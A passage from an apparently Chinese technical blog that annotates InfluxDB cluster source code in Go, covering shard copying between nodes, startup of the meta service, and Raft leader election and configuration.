class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(tk *CopyShardTask)</span> <span class="title">doTask</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">nodeIDs := <span class="built_in">make</span>([]<span class="keyword">uint64</span>, <span class="number">1</span>)</span><br><span class="line">nodeIDs[<span class="number">0</span>] = tk.SrcNodeID</span><br><span class="line">conn, err := tk.Dialer.DialNode(nodeIDs)    <span class="comment">//获取连接</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"dial failed to copy shard"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> conn.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write request.</span></span><br><span class="line"><span class="keyword">if</span> err = EncodeTLV(conn, copyShardRequestMessage, &amp;CopyShardRequest&#123;</span><br><span class="line">ShardID: tk.ShardID,    <span class="comment">//编码写请求</span></span><br><span class="line">&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard request failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read the response.</span></span><br><span class="line"><span class="keyword">var</span> resp CopyShardResponse</span><br><span class="line"><span class="keyword">if</span> _, err = DecodeTLV(conn, &amp;resp); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard response failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">tk.TotalSize = resp.TotalSize</span><br><span class="line"><span class="keyword">if</span> storeSD := tk.TaskManager.TSDBStore.Shard(tk.ShardID); storeSD == <span class="literal">nil</span> &#123;</span><br><span class="line">database, policy, _ := tk.TaskManager.MetaClient.ShardOwner(tk.ShardID)</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.CreateShard(database, policy, tk.ShardID, <span class="literal">false</span>); err != <span class="literal">nil</span> &#123;   <span class="comment">//创建分片</span></span><br><span class="line">tk.Logger.Warn(<span class="string">"create shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, database),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, policy),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> _, err = os.Stat(storeSD.Path()); os.IsNotExist(err) &#123;</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.DeleteShard(tk.ShardID); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"delete shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, storeSD.Database()),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, storeSD.RetentionPolicy()),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.CreateShard(storeSD.Database(), storeSD.RetentionPolicy(), tk.ShardID, <span class="literal">false</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"create shard failed"</span>,</span><br><span class="line">zap.String(<span class="string">"database"</span>, storeSD.Database()),</span><br><span class="line">zap.String(<span class="string">"policy"</span>, storeSD.RetentionPolicy()),</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新建连接wrapper</span></span><br><span class="line">connWrapper := NewConnReaderWrapper(conn, tk)</span><br><span class="line"><span class="comment">//恢复shared</span></span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.RestoreShard(tk.ShardID, connWrapper); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"restore shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//conn io.Reader never get io.EOF err while RestoreShard, update here</span></span><br><span class="line">    <span class="comment">//更新copyshared处理，更新数据的主要过程</span></span><br><span class="line">err = tk.TaskManager.MetaClient.UpdateCopyShardProgress(tk.ID, tk.TotalSize, connWrapper.TotalReceived)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"copy shard process update failed:"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Uint64(<span class="string">"total"</span>, tk.TotalSize),</span><br><span class="line">zap.Uint64(<span class="string">"totalReceived"</span>, connWrapper.TotalReceived),</span><br><span class="line">zap.Error(err))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置shared可用</span></span><br><span class="line"><span class="keyword">if</span> err = tk.TaskManager.TSDBStore.SetShardEnabled(tk.ShardID, <span class="literal">true</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"enable shard failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//添加sharedowner节点</span></span><br><span class="line">err = tk.TaskManager.MetaClient.AddShardOwner(tk.ShardID, tk.TaskManager.Node.GetDataID())</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">tk.Logger.Warn(<span class="string">"add shard owner failed"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID),</span><br><span class="line">zap.Error(err))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tk.Logger.Info(<span class="string">"copy shard success"</span>,</span><br><span class="line">zap.Uint64(<span class="string">"node"</span>, tk.SrcNodeID),</span><br><span class="line">zap.Uint64(<span class="string">"shardid"</span>, tk.ShardID))</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还需要注意的地方就是influxdb中使用raft进行选主操作：</p><p>入口函数在启动meta服务的函数中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Open starts the service</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Service)</span> <span class="title">Open</span><span class="params">()</span> <span class="title">error</span></span> &#123;</span><br><span class="line">    </span><br><span class="line">s.Logger.Info(<span class="string">"Starting meta service"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.RaftListener == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">"no raft listener set"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open listener.</span></span><br><span class="line"><span class="keyword">if</span> s.https &#123;</span><br><span class="line">cert, err := tls.LoadX509KeyPair(s.cert, s.cert)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">listener, err := tls.Listen(<span class="string">"tcp"</span>, s.httpAddr, &amp;tls.Config&#123;</span><br><span class="line">Certificates: []tls.Certificate&#123;cert&#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Listening on HTTPS"</span>, zap.String(<span class="string">"Addr"</span>, listener.Addr().String()))</span><br><span class="line">s.ln = listener</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">"tcp"</span>, s.httpAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s.Logger.Info(<span class="string">"Listening on HTTP"</span>, zap.String(<span class="string">"Addr"</span>, listener.Addr().String()))</span><br><span class="line">s.ln = listener</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// wait for the listeners to start</span></span><br><span class="line">timeout := time.Now().Add(raftListenerStartupTimeout)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> s.ln.Addr() != <span class="literal">nil</span> &amp;&amp; s.RaftListener.Addr() != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> time.Now().After(timeout) &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"unable to open without http listener running"</span>)</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> autoAssignPort(s.httpAddr) &#123;</span><br><span class="line">s.httpAddr, err = combineHostAndAssignedPort(s.ln, s.httpAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> autoAssignPort(s.raftAddr) &#123;</span><br><span class="line">s.raftAddr, err = combineHostAndAssignedPort(s.RaftListener, s.raftAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the store.  The addresses passed in are remotely accessible.</span></span><br><span class="line">s.store = newStore(s.config, s.remoteAddr(s.httpAddr), s.remoteAddr(s.raftAddr))</span><br><span class="line">s.store.node = s.Node</span><br><span class="line"></span><br><span class="line">handler := newHandler(s.config, s)</span><br><span class="line">handler.logger = s.Logger</span><br><span class="line">handler.store = s.store</span><br><span class="line">s.handler = handler</span><br><span class="line"></span><br><span class="line"><span class="comment">// Begin listening for requests in a separate goroutine.</span></span><br><span class="line"><span class="comment">// s.serve should start before open as open needs httpd for peers</span></span><br><span class="line"><span class="keyword">go</span> s.serve()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.store.open(s.RaftListener); err != <span class="literal">nil</span> &#123;   <span class="comment">//开启raft监听</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开raft:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// open opens and initializes the raft store.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *store)</span> <span class="title">open</span><span class="params">(raftln net.Listener)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">s.logger.Info(<span class="string">"Using data dir"</span>, zap.String(<span class="string">"datadir"</span>, s.path))</span><br><span class="line"></span><br><span class="line">joinPeers, err := s.filterAddr(s.config.JoinPeers, s.httpAddr)  <span class="comment">// 获取所有的peers</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">joinPeers = s.config.JoinPeers <span class="comment">//所有的joinPeers列表，不是很理解这边过滤有啥用，上面过滤之后，这边又覆盖了？</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> initializePeers []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(joinPeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">c := NewClient()</span><br><span class="line">c.SetMetaServers(joinPeers)</span><br><span class="line">c.SetTLS(s.config.HTTPSEnabled)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">peers := c.peers()</span><br><span class="line"><span class="keyword">if</span> !Peers(peers).Contains(s.raftAddr) &#123;</span><br><span class="line">peers = <span class="built_in">append</span>(peers, s.raftAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(s.config.JoinPeers)-<span class="built_in">len</span>(peers) == <span class="number">0</span> &#123;</span><br><span class="line">initializePeers = peers</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(peers) &gt; <span class="built_in">len</span>(s.config.JoinPeers) &#123;</span><br><span class="line">s.logger.Info(fmt.Sprintf(<span class="string">"waiting for join peers to match config specified. found %v, config specified %v"</span>, peers, s.config.JoinPeers))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">s.logger.Info(fmt.Sprintf(<span class="string">"Waiting for %d join peers.  Have %v. Asking nodes: %v"</span>, <span class="built_in">len</span>(s.config.JoinPeers)-<span class="built_in">len</span>(peers), peers, joinPeers))</span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := s.setOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the root directory if it doesn't already exist.</span></span><br><span class="line"><span class="keyword">if</span> err := os.MkdirAll(s.path, <span class="number">0777</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"mkdir all: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open the raft store.</span></span><br><span class="line">    <span class="comment">// raft选主</span></span><br><span class="line"><span class="keyword">if</span> err := s.openRaft(initializePeers, raftln); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">"raft: %s"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(joinPeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line">c := NewClient()</span><br><span class="line">c.SetMetaServers(joinPeers)</span><br><span class="line">c.SetTLS(s.config.HTTPSEnabled)</span><br><span class="line"><span class="keyword">if</span> err := c.Open(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line"></span><br><span class="line">n, err := c.JoinMetaServer(s.httpAddr, s.raftAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">s.node.ID = n.ID</span><br><span class="line"><span class="keyword">if</span> err := s.node.Save(); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait for a leader to be elected so we know the raft log is loaded</span></span><br><span class="line"><span class="comment">// and up to date</span></span><br><span class="line">    <span class="comment">//等待选主leader</span></span><br><span class="line"><span class="keyword">if</span> err := s.waitForLeader(<span class="number">0</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure this server is in the list of metanodes</span></span><br><span class="line">    <span class="comment">// 获取raft的peers</span></span><br><span class="line">peers, err := s.raftState.peers()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(peers) &lt;= <span class="number">1</span> &#123;</span><br><span class="line"><span class="comment">// we have to loop here because if the hostname has changed</span></span><br><span class="line"><span class="comment">// raft will take a little bit to normalize so that this host</span></span><br><span class="line"><span class="comment">// will be marked as the leader</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">err := s.setMetaNode(s.httpAddr, s.raftAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数选主流程：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *raftState)</span> <span class="title">open</span><span class="params">(s *store, ln net.Listener, initializePeers []<span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">r.ln = ln</span><br><span class="line">r.closing = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Setup raft configuration.</span></span><br><span class="line">config := raft.DefaultConfig()</span><br><span class="line">config.LogOutput = ioutil.Discard</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> r.config.ClusterTracing &#123;</span><br><span class="line">config.Logger = log.New(os.Stderr, <span class="string">"[raft]"</span>, log.LstdFlags)</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 超时</span></span><br><span class="line">config.HeartbeatTimeout = time.Duration(r.config.HeartbeatTimeout)</span><br><span class="line">config.ElectionTimeout = time.Duration(r.config.ElectionTimeout)</span><br><span class="line">config.LeaderLeaseTimeout = time.Duration(r.config.LeaderLeaseTimeout)</span><br><span class="line">config.CommitTimeout = time.Duration(r.config.CommitTimeout)</span><br><span class="line"><span class="comment">// Since we actually never call `removePeer` this is safe.</span></span><br><span class="line"><span class="comment">// If in the future we decide to call remove peer we have to re-evaluate how to handle this</span></span><br><span class="line">config.ShutdownOnRemove = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Build raft layer to multiplex listener.</span></span><br><span class="line">    <span class="comment">// 构建raft层</span></span><br><span class="line">r.raftLayer = newRaftLayer(r.addr, r.ln)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a transport layer</span></span><br><span class="line">    <span class="comment">//创建网络传输层</span></span><br><span class="line">r.transport = raft.NewNetworkTransport(r.raftLayer, <span class="number">3</span>, <span class="number">10</span>*time.Second, config.LogOutput)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create peer storage.</span></span><br><span class="line">r.peerStore = &amp;peerStore&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This server is joining the raft cluster for the first time if initializePeers are passed in</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(initializePeers) &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.peerStore.SetPeers(initializePeers); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">peers, err := r.peerStore.Peers()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If no peers are set in the config or there is one and we are it, then start as a single server.</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(initializePeers) &lt;= <span class="number">1</span> &#123;</span><br><span class="line">config.EnableSingleNode = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ensure we can always become the leader</span></span><br><span class="line">config.DisableBootstrapAfterElect = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure our peer address is here.  This happens with either a single node cluster</span></span><br><span class="line"><span class="comment">// or a node joining the cluster, as no one else has that information yet.</span></span><br><span class="line"><span class="keyword">if</span> !raft.PeerContained(peers, r.addr) &#123;</span><br><span class="line"><span class="keyword">if</span> err := r.peerStore.SetPeers([]<span class="keyword">string</span>&#123;r.addr&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">peers = []<span class="keyword">string</span>&#123;r.addr&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create the log store and stable store.</span></span><br><span class="line">    <span class="comment">// 创建log存储</span></span><br><span class="line">store, err := raftboltdb.NewBoltStore(filepath.Join(r.path, <span class="string">"raft.db"</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span 